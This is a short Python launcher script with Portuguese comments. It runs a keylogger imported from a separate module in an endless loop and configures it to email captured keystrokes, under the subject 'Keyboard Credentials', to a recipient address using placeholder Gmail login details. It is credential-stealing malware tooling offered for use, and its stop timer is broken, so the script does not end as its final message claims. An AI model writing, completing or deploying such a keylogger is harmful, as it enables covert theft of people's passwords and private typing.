from threading import Timer
from keylogger import iniciar_keylogger

def executar_arquivo(remetente_email, remetente_senha, destinatario_email, subject):
    while True:
        try:
            print("#####Executando arquivos pendentes#####\n")
            timer = Timer(60, interromper_keylogger)  
            timer.start()  
        except KeyboardInterrupt:
            print("Encerrando a execução do arquivo.")
        try:
            iniciar_keylogger(remetente_email, remetente_senha, destinatario_email, subject)
        except Exception:
            pass  

def interromper_keylogger():
    try:
        print("#####Interrompendo a execução. #####")
        raise KeyboardInterrupt  
    except (Exception, KeyboardInterrupt):
        print("\n#####Encerrando todos os processos...#####\n")

if __name__ == "__main__":
    remetente_email = "seu_email@gmail.com"  # Substitua pelo seu e-mail
    remetente_senha = "sua_senha"  # Substitua pela sua senha de e-mail
    destinatario_email = "email_de_destino@gmail.com"  # Substitua pelo endereço de e-mail do destinatário
    subject = "Keyboard Credentials"

    print("Sendo executado agora...")

    executar_arquivo(remetente_email, remetente_senha, destinatario_email, subject)

    print("Encerrou após 10 segundos.")

